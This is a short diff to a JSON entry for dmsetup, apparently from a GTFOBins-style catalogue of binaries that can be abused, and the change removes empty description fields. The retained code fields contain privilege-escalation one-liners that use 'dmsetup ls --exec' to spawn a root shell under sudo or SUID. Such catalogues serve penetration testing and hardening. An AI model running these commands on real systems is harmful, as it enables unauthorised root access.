@@ -2,13 +2,13 @@
   "functions": {
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n"
       }
     ]
